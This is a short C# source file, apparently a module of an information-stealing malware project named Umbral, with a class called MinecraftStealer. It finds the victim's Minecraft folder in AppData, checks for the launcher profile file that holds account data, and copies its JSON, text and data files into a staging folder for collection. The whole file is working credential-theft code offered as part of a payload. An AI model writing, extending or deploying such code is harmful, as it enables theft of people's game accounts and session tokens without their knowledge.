using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Umbral.payload.Games.Minecraft
{
    internal static class MinecraftStealer
    {
        static private readonly string MinecraftFolderPath;

        static MinecraftStealer()
        {
            string roamingPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            MinecraftFolderPath = Path.Combine(roamingPath, ".minecraft");
        }

        internal static async Task<bool> StealMinecraftFiles(string dst)
        {
            string[] allowedExtentions = { ".json", ".txt", ".dat" };
            if (Directory.Exists(MinecraftFolderPath) &&
                File.Exists(Path.Combine(MinecraftFolderPath, "launcher_profiles.json")))
            {
                string[] files = await Task.Run(() =>
                    Directory.GetFiles(MinecraftFolderPath, "*.*", SearchOption.TopDirectoryOnly)
                        .Where(file => allowedExtentions.Contains(Path.GetExtension(file))).ToArray());

                if (files.Length > 0)
                {
                    Directory.CreateDirectory(dst);
                    foreach (string filepath in files)
                        try
                        {
                            string newPath = Path.Combine(dst, Path.GetFileName(filepath));
                            File.Copy(filepath, newPath);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        }

                    return true;
                }
            }

            return false;
        }
    }
}